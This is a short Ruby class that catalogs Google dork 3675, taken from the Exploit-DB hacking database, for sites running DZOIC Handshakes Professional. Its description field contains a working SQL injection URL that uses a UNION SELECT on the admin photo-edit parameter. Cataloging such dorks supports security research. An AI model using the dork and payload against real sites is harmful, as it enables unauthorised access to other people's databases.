module Dorks
   class Dork3675 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3675",
            ghdb_url: "https://www.exploit-db.com/ghdb/3675",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2011-01-20",
            author: "anonymous",
            dork: <<~EDORK,
intext:"Powered by DZOIC Handshakes Professional"
EDORK
            description: <<~EDESC
Author: IR-Security -Team SQL injection: http://server/administrator/index.php?section=manage_members&action=edit_photo&pho_id=-100001 union all select 1,version()--
EDESC
         })

      end
   end
end
